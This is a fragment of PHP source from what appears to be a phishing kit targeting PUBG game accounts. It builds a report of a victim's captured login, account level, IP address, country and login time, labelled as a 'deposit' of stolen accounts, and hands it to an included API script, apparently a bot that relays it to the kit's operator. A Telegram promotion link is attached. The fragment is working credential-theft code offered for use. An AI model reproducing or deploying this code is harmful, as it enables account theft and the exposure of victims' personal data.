...
<a style="background-image: linear-gradient(#179CDE, #0088CC); width: 55%; margin-top: 10px; margin-left: auto; margin-right: auto; padding: 6px; color: #fff; font-size: 15px; text-align: center; text-transform: uppercase; text-decoration: none; border-radius: 3px; outline: none; display: block;" href="https://t.me/arpantek_me">Find Me on Telegram</a>
</div>
</center>
';
$msgg = '
=========================
SCHT SETOR ACC PUBG BOSS
=========================
...
ACCOUNT LEVEL: '.$level.'
LOGIN: '.$login.'
IP ADDRESS: '.$arpantek_ip_address.'
COUNTRY: '.$arpantek_country.'
LOGIN TIME: '.$jamasuk.'
=========================
';
$sendbot = $msgg;include'system/api.php';
